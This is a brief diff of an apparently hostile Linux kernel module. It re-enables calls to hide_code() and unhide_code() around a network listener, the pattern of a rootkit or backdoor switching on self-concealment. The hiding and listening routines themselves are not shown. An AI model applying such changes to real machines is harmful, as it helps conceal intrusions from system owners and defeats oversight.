@@ -15,7 +15,7 @@ MODULE_LICENSE("GPL");
 
 static int __init mod_init(void)
 {
-  //hide_code();
+  hide_code();
   listen();
   printk(KERN_INFO "mod_init\n");
   return 0;
@@ -24,7 +24,7 @@ static int __init mod_init(void)
 static void __exit mod_exit(void)
 {
   stop_listen();
-  //unhide_code();
+  unhide_code();
 }
 
 
